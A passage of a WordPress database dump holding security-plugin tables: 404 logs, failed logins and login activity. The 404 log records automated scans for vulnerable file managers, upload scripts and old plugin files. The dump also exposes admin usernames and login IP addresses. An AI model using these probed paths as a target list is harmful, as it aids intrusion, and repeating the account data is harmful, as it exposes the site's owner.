INSERT INTO `cmrfu_aiowps_events` VALUES("960","404","","0","2016-12-17 06:31:33","66.249.90.176","","/wp-content/uploads/wpcf7_captcha/216331582.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("961","404","","0","2016-12-17 13:08:22","66.249.73.211","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("962","404","","0","2016-12-17 17:20:43","66.249.73.174","","/hijyen.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("963","404","","0","2016-12-17 20:02:03","66.249.73.178","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("964","404","","0","2016-12-17 22:36:32","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1903216453.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("965","404","","0","2016-12-17 22:40:00","66.249.73.174","","/iletisim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("966","404","","0","2016-12-19 00:34:12","198.204.227.58","","/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("967","404","","0","2016-12-19 00:34:13","198.204.227.58","","/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("968","404","","0","2016-12-19 00:34:14","198.204.227.58","","/includes/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("969","404","","0","2016-12-19 00:34:15","198.204.227.58","","/fckeditor/elFinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("970","404","","0","2016-12-19 00:34:16","198.204.227.58","","/admin/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("971","404","","0","2016-12-19 00:34:16","198.204.227.58","","/assets/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("972","404","","0","2016-12-19 00:34:17","198.204.227.58","","/library/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("973","404","","0","2016-12-19 00:34:18","198.204.227.58","","/lib/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("974","404","","0","2016-12-19 00:34:19","198.204.227.58","","/jscripts/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("975","404","","0","2016-12-19 00:34:20","198.204.227.58","","/assets/plugins/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("976","404","","0","2016-12-19 21:20:46","157.55.39.181","","/english/index.htm","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("977","404","","0","2016-12-19 22:13:35","195.154.199.56","","/update.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("978","404","","0","2016-12-19 22:13:41","195.154.199.56","","/update.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("979","404","","0","2016-12-21 01:59:02","157.55.39.64","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("980","404","","0","2016-12-21 03:17:13","195.154.191.64","","/upload.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("981","404","","0","2016-12-21 03:17:18","195.154.191.64","","/upload.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("982","404","","0","2016-12-21 23:07:07","66.249.69.14","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("983","404","","0","2016-12-21 23:22:24","66.249.69.18","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("984","404","","0","2016-12-22 01:18:43","66.249.69.59","","/uretim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("985","404","","0","2016-12-22 17:55:21","66.249.69.18","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("986","404","","0","2016-12-22 21:20:45","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1787928495.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("987","404","","0","2016-12-22 21:48:47","66.249.69.55","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("988","404","","0","2016-12-22 23:32:26","157.55.39.246","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("989","404","","0","2016-12-23 02:48:31","66.249.91.5","","/wp-content/uploads/wpcf7_captcha/1759280834.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("990","404","","0","2016-12-23 02:54:53","66.249.91.7","","/wp-content/uploads/wpcf7_captcha/3885945436.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("991","404","","0","2016-12-23 03:27:07","157.55.39.246","","/iletisim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("992","404","","0","2016-12-23 04:31:43","66.249.91.9","","/wp-content/uploads/wpcf7_captcha/3885945436.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("993","404","","0","2016-12-23 04:31:44","66.249.91.5","","/wp-content/uploads/wpcf7_captcha/1759280834.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("994","404","","0","2016-12-23 17:59:13","66.249.91.5","","/wp-content/uploads/wpcf7_captcha/1759280834.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("995","404","","0","2016-12-23 17:59:37","66.249.91.7","","/wp-content/uploads/wpcf7_captcha/3885945436.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("996","404","","0","2016-12-23 20:08:37","195.154.199.66","","/upload.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("997","404","","0","2016-12-23 20:08:41","195.154.199.66","","/upload.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("998","404","","0","2016-12-24 07:15:37","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/3885945436.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("999","404","","0","2016-12-24 07:15:40","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/1759280834.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1000","404","","0","2016-12-24 11:06:47","179.184.66.64","","/wp-content/plugins/ninja-forms/ninja_forms.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1001","404","","0","2016-12-24 11:06:48","179.184.66.64","","/wp-content/plugins/wp-e-commerce/license.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1002","404","","0","2016-12-24 11:06:48","179.184.66.64","","/wp-content/plugins/mac-dock-gallery/bugslist.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1003","404","","0","2016-12-24 11:06:48","179.184.66.64","","/wp-content/plugins/wpmarketplace/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1004","404","","0","2016-12-24 11:06:49","179.184.66.64","","/wp-content/plugins/wp-editor/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1005","404","","0","2016-12-24 11:06:49","179.184.66.64","","/wp-content/plugins/magic-fields/MF_Constant.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1006","404","","0","2016-12-24 11:06:49","179.184.66.64","","/wp-content/plugins/gallery-plugin/gallery-plugin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1007","404","","0","2016-12-24 11:06:50","179.184.66.64","","/wp-content/plugins/wp-image-news-slider/functions.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1008","404","","0","2016-12-24 11:06:50","179.184.66.64","","/wp-content/plugins/wpmarketplace/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1009","404","","0","2016-12-24 11:06:53","179.184.66.64","","/wp-content/plugins/wp-homepage-slideshow/functions.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1010","404","","0","2016-12-24 11:06:53","179.184.66.64","","/wp-content/plugins/resume-submissions-job-postings/installer.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1011","404","","0","2016-12-24 11:06:54","179.184.66.64","","/wp-content/plugins/wpstorecart/lgpl.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1012","404","","0","2016-12-24 11:06:54","179.184.66.64","","/wp-content/plugins/category-grid-view-gallery/cat_grid.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1013","404","","0","2016-12-24 11:06:54","179.184.66.64","","/wp-content/plugins/custom-content-type-manager/index.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1014","404","","0","2016-12-24 11:06:55","179.184.66.64","","/wp-content/plugins/front-end-upload/destination.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1015","404","","0","2016-12-24 11:06:55","179.184.66.64","","/wp-content/plugins/fcchat/default.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1016","404","","0","2016-12-24 11:06:57","179.184.66.64","","/wp-content/plugins/cimy-user-extra-fields/README_OFFICIAL.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1017","404","","0","2016-12-24 11:06:58","179.184.66.64","","/wp-content/plugins/wp-property/action_hooks.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1018","404","","0","2016-12-24 11:06:59","179.184.66.64","","/wp-content/plugins/wp-filemanager/fm.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1019","404","","0","2016-12-24 11:07:04","179.184.66.64","","/wp-content/plugins/user-avatar/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1020","404","","0","2016-12-24 11:07:04","179.184.66.64","","/wp-content/plugins/nextgen-gallery/changelog.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1021","404","","0","2016-12-24 11:07:05","179.184.66.64","","/wp-content/plugins/font-uploader/font-uploader-free.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1022","404","","0","2016-12-24 11:07:08","179.184.66.64","","/wp-content/plugins/nmedia-user-file-uploader/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1023","404","","0","2016-12-24 11:07:11","179.184.66.64","","/wp-content/plugins/another-wordpress-classifieds-plugin/AWPCP.po","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1024","404","","0","2016-12-24 11:07:14","179.184.66.64","","/wp-content/plugins/auto-attachments/a-a.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1025","404","","0","2016-12-24 11:07:16","179.184.66.64","","/wp-content/plugins/simple-dropbox-upload-form/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1026","404","","0","2016-12-24 11:07:16","179.184.66.64","","/wp-content/plugins/user-photo/admin.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1027","404","","0","2016-12-24 11:07:19","179.184.66.64","","/wp-content/plugins/zingiri-web-shop/admin.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1028","404","","0","2016-12-24 11:07:22","179.184.66.64","","/wp-content/plugins/user-meta/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1029","404","","0","2016-12-24 11:07:22","179.184.66.64","","/wp-content/plugins/front-end-upload/destination.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1030","404","","0","2016-12-24 11:56:12","195.154.194.116","","/up.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1031","404","","0","2016-12-24 11:56:18","195.154.194.116","","/up.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1032","404","","0","2016-12-24 14:59:00","66.249.64.58","","/uretim_izin.pdf","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1033","404","","0","2016-12-24 15:02:30","66.249.89.24","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1034","404","","0","2016-12-24 19:27:17","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/1759280834.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1035","404","","0","2016-12-24 19:27:37","66.249.89.24","","/wp-content/uploads/wpcf7_captcha/3885945436.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1036","404","","0","2016-12-25 05:22:40","198.204.227.58","","/Includes/Advertiser/uploadTester.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1037","404","","0","2016-12-25 05:22:46","198.204.227.58","","/uploadTester.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1038","404","","0","2016-12-25 05:22:52","198.204.227.58","","/ceprtools/freeASPUpload/uploadTester.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1039","404","","0","2016-12-25 05:22:58","198.204.227.58","","/sell/excess/uploadTester.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1040","404","","0","2016-12-25 05:23:06","198.204.227.58","","/test/operator/UploadFile/uploadTester.asp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1041","404","","0","2016-12-25 10:04:14","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3885945436.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1042","404","","0","2016-12-25 10:04:22","66.249.92.72","","/wp-content/uploads/wpcf7_captcha/1759280834.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1043","404","","0","2016-12-25 13:15:07","66.249.66.158","","/uretim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1044","404","","0","2016-12-25 15:35:32","40.77.167.48","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1045","404","","0","2016-12-26 18:00:46","195.154.199.56","","/udd.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1046","404","","0","2016-12-26 18:00:48","195.154.199.56","","/udd.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1047","404","","0","2016-12-28 04:43:41","66.249.64.47","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1048","404","","0","2016-12-28 08:47:31","66.249.64.49","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1049","404","","0","2016-12-28 18:23:53","195.154.199.56","","/wp-content/plugins/ubh/up.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1050","404","","0","2016-12-29 22:55:21","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/3944801995.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1051","404","","0","2016-12-30 00:40:14","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/293092688.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1052","404","","0","2016-12-30 02:59:25","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/293092688.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1053","404","","0","2016-12-30 14:31:40","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/293092688.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1054","404","","0","2016-12-31 03:17:37","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/293092688.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1055","404","","0","2016-12-31 17:14:06","72.14.199.76","","/wp-content/uploads/wpcf7_captcha/293092688.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1056","404","","0","2017-01-01 06:51:30","72.14.199.76","","/wp-content/uploads/wpcf7_captcha/293092688.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1057","404","","0","2017-01-01 13:37:32","66.249.79.149","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1058","404","","0","2017-01-02 02:17:50","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/313410203.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1059","404","","0","2017-01-02 03:12:32","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/313410203.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1060","404","","0","2017-01-02 15:31:16","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/313410203.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1061","404","","0","2017-01-03 05:57:55","66.249.91.7","","/wp-content/uploads/wpcf7_captcha/313410203.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1062","404","","0","2017-01-03 11:43:28","66.249.69.18","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1063","404","","0","2017-01-03 14:29:49","204.79.180.78","https://www.ismido.com.tr/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1064","404","","0","2017-01-03 19:13:16","66.249.89.25","","/wp-content/uploads/wpcf7_captcha/313410203.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1065","404","","0","2017-01-04 06:43:45","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/2139320657.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1066","404","","0","2017-01-04 08:29:25","66.249.89.23","","/wp-content/uploads/wpcf7_captcha/313410203.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1067","404","","0","2017-01-04 20:58:48","157.55.39.21","","/iletisim.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1068","404","","0","2017-01-05 03:53:05","204.79.180.30","https://www.ismido.com.tr/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1069","404","","0","2017-01-05 16:06:52","66.249.64.47","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1070","404","","0","2017-01-06 04:37:26","204.79.180.56","https://www.ismido.com.tr/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1071","404","","0","2017-01-06 06:31:51","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/2534115833.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1072","404","","0","2017-01-07 00:03:24","66.249.73.215","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1073","404","","0","2017-01-07 00:17:26","66.249.90.176","","/wp-content/uploads/wpcf7_captcha/681807880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1074","404","","0","2017-01-07 02:16:08","204.79.180.216","https://www.ismido.com.tr/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1075","404","","0","2017-01-07 02:40:02","66.249.90.176","","/wp-content/uploads/wpcf7_captcha/681807880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1076","404","","0","2017-01-07 15:25:29","66.249.90.176","","/wp-content/uploads/wpcf7_captcha/681807880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1077","404","","0","2017-01-08 03:02:54","204.79.180.191","https://www.ismido.com.tr/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1078","404","","0","2017-01-08 12:55:03","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/2727498230.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1079","404","","0","2017-01-08 15:01:30","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/681807880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1080","404","","0","2017-01-08 18:33:41","195.154.199.56","","/images/logo_img.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("1081","404","","0","2017-01-08 18:33:46","195.154.199.56","","/images/logo_img.php","","");


DROP TABLE IF EXISTS `cmrfu_aiowps_failed_logins`;

CREATE TABLE `cmrfu_aiowps_failed_logins` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `user_login` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_login_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `login_attempt_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1","0","ismido123","2016-11-23 04:04:32","176.42.249.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("2","1","ismido123","2016-11-23 14:41:01","176.42.249.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("3","0","herkon123","2016-11-23 14:41:10","176.42.249.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("4","0","ismido","2016-11-23 14:41:20","176.42.249.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("5","1","ismido123","2016-11-23 14:41:25","176.42.249.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("6","1","ismido123","2017-01-08 20:59:46","93.182.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("7","0","ismidov2","2017-01-13 19:30:59","93.182.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("8","0","ismido","2017-01-23 00:13:14","91.200.12.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("9","1","ismido123","2017-01-30 22:54:00","93.182.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("10","1","ismido123","2017-02-04 14:13:51","78.135.9.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("11","1","ismido123","2017-03-11 09:43:47","151.250.10.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("12","1","ismido123","2017-03-11 09:44:40","151.250.10.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("13","1","ismido123","2017-03-11 09:45:04","151.250.10.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("14","1","ismido123","2017-03-11 09:45:31","151.250.10.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("15","1","ismido123","2017-03-11 09:46:15","151.250.10.*");


DROP TABLE IF EXISTS `cmrfu_aiowps_global_meta`;

CREATE TABLE `cmrfu_aiowps_global_meta` (
  `meta_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `date_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `meta_key1` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key2` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key3` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key4` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key5` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value1` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value2` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value3` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value4` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value5` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`meta_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_aiowps_login_activity`;

CREATE TABLE `cmrfu_aiowps_login_activity` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `user_login` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `login_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `logout_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `login_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `login_country` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `browser_type` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_aiowps_login_activity` VALUES("1","1","herkon123","2016-11-16 22:53:44","0000-00-00 00:00:00","176.232.0.63","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("2","1","herkon123","2016-11-17 00:10:51","0000-00-00 00:00:00","176.232.0.63","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("3","1","herkon123","2016-11-22 23:01:46","0000-00-00 00:00:00","127.0.0.1","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("4","1","herkon123","2016-11-23 00:20:30","2016-11-23 04:03:53","176.42.249.108","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("5","1","herkon123","2016-11-23 00:23:47","2016-11-23 04:03:53","176.42.249.108","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("6","1","herkon123","2016-11-23 03:56:40","2016-11-23 04:03:53","176.42.249.108","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("7","1","herkon123","2016-11-23 04:04:45","0000-00-00 00:00:00","176.42.249.108","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("8","1","ismido123","2016-11-23 14:41:48","0000-00-00 00:00:00","176.42.249.108","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("9","1","ismido123","2016-12-01 21:12:15","0000-00-00 00:00:00","78.135.61.182","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("10","1","ismido123","2017-01-08 21:00:38","0000-00-00 00:00:00","93.182.74.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("11","1","ismido123","2017-01-13 19:31:07","0000-00-00 00:00:00","93.182.74.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("12","1","ismido123","2017-01-13 19:35:30","0000-00-00 00:00:00","93.182.74.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("13","1","ismido123","2017-01-23 17:00:05","0000-00-00 00:00:00","78.135.61.182","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("14","1","ismido123","2017-01-25 20:38:36","0000-00-00 00:00:00","94.79.88.66","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("15","1","ismido123","2017-01-30 22:45:32","0000-00-00 00:00:00","93.182.74.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("16","1","ismido123","2017-01-30 22:54:08","0000-00-00 00:00:00","93.182.74.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("17","1","ismido123","2017-02-04 14:14:03","0000-00-00 00:00:00","78.135.9.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("18","1","ismido123","2017-03-10 10:24:14","0000-00-00 00:00:00","95.164.1.157","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("19","1","ismido123","2017-03-11 09:46:48","0000-00-00 00:00:00","151.250.10.121","","");


DROP TABLE IF EXISTS `cmrfu_aiowps_login_lockdown`;

CREATE TABLE `cmrfu_aiowps_login_lockdown` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `user_login` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `lockdown_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `release_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `failed_login_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `lock_reason` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `unlock_key` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_aiowps_permanent_block`;

CREATE TABLE `cmrfu_aiowps_permanent_block` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `blocked_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `block_reason` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `country_origin` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `blocked_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_commentmeta`;

CREATE TABLE `cmrfu_commentmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `comment_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`meta_id`),
  KEY `comment_id` (`comment_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_comments`;

CREATE TABLE `cmrfu_comments` (
  `comment_ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `comment_post_ID` bigint(20) unsigned NOT NULL DEFAULT '0',
  `comment_author` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_author_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_url` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_IP` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_content` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_karma` int(11) NOT NULL DEFAULT '0',
  `comment_approved` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '1',
  `comment_agent` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
